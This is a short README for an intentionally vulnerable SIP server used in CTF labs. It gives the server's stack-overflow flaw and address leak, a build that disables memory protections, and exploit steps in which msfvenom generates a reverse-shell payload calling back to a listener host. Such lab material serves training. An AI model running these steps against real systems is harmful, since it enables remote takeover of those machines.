A very basic Super Vulnerable Sip Server - SVSS for CTFs

 * vuln_sip.c - vulernable server code

 * Minimal vulnerable SIP UDP server for CTF labs.
 * On each request it copies the incoming message unsafely into a stack buffer (vulnerable),
 * prints the buffer address to stdout, and replies with a SIP 200 OK where:
    - If a header is present in the request, the same header is echoed back.
    - If a header is missing, a sensible default value is used in the response.
    - The CSeq header contains the leaked buffer address: "CSeq: buf address: 0x..."
 
 * Build (lab only):
    - gcc -fno-stack-protector -z execstack -no-pie -Wno-return-local-addr -o vuln_sip vuln_sip.c
 
 * Run:
   - ./vuln_sip
 
 * WARNING: Intentionally vulnerable. Run only in an isolated lab.

Exploit script included -

1. msfvenom -p linux/x64/shell_reverse_tcp -f python -b "\x00\x0d\x20\x0a" LPORT=6666 LHOST=10.1.0.1 -v -v shellcode EXITFUNC=thread  -f python
2. include output from above in shellcode section of vuln_sip.c
3. Listen nc -l -p 6666 - run exploit against UDP endpoint - python3 exploit_read_cseq.py <host> <port> 
